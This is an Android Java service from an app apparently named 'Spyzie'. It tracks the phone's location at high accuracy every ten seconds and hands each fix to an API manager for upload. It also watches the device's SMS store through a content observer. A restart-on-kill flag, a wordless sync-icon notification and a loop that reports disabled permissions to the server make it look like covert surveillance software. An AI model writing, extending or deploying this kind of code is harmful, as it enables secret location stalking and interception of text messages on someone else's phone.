package com.tantd.spyzie.service;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.location.Location;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.tantd.spyzie.R;
import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.network.ApiManager;
import com.tantd.spyzie.receiver.SmsObserver;
import com.tantd.spyzie.util.CommonUtils;
import com.tantd.spyzie.util.Constants;

import javax.inject.Inject;

public class SpyzieService extends Service {

    public static final String CHANNEL_ID = "ForegroundServiceChannel";

    private static final String DEBUG_SUB_TAG = "[" + SpyzieService.class.getSimpleName() + "] ";

    @Inject
    ApiManager mApiManager;

    private static final int UPDATE_INTERVAL = 10 * 1000;
    private static final int FASTEST_UPDATE_INTERVAL = 10 * 1000;
    private static final int CONDITION_CHECKING_INTERVAL = 5 * 1000;

    private FusedLocationProviderClient mLocationProviderClient;
    private LocationCallback mLocationCallback;

    private ContentObserver mContentObserver;

    @Override
    public void onCreate() {
        SpyzieApplication.getInstance().getAppComponent().inject(this);
        super.onCreate();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onCreate()");
        mLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);
        mLocationCallback = new LocationCallback() {

            @Override
            public void onLocationResult(LocationResult locationResult) {
                Location location = locationResult.getLastLocation();
                if (location != null) {
                    mApiManager.sendLocationData(location);
                }
            }
        };

        mContentObserver = new SmsObserver(new Handler(), this);
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mContentObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onStartCommand()");
        createNotificationChannelForAndroidO();

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_sync)
                .build();

        new Thread(() -> {
            while (true) {
                boolean hasLocationPermissions = checkLocationPermissions();
                boolean isLocationTurnOn = CommonUtils.isLocationTurnOn(this);
                Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "hasPermissions=" + hasLocationPermissions
                                + ", isLocationOn=" + isLocationTurnOn);
                if (hasLocationPermissions && isLocationTurnOn) {
                    startForeground(1, notification);
                    requestLocationUpdates();
                } else {
                    removeLocationUpdates();
                    stopForeground(true);
                    if (!hasLocationPermissions) {
                        mApiManager.sendExceptionTracking(Error.HAS_NO_LOCATION_PERMISSIONS);
                    }
                    if (!isLocationTurnOn) {
                        mApiManager.sendExceptionTracking(Error.LOCATION_IS_OFF);
                    }
                }
                try {
                    Thread.sleep(CONDITION_CHECKING_INTERVAL);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onDestroy()");
        getContentResolver().unregisterContentObserver(mContentObserver);
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannelForAndroidO() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private boolean checkLocationPermissions() {
        return CommonUtils.hasPermissions(this, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION
                        , Manifest.permission.ACCESS_FINE_LOCATION});
    }

    private void requestLocationUpdates() {
        LocationRequest locationRequest = new LocationRequest();
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationRequest.setInterval(UPDATE_INTERVAL);
        locationRequest.setFastestInterval(FASTEST_UPDATE_INTERVAL);
        mLocationProviderClient.requestLocationUpdates(locationRequest, mLocationCallback, Looper.getMainLooper());
    }

    private void removeLocationUpdates() {
        mLocationProviderClient.removeLocationUpdates(mLocationCallback);
    }
}
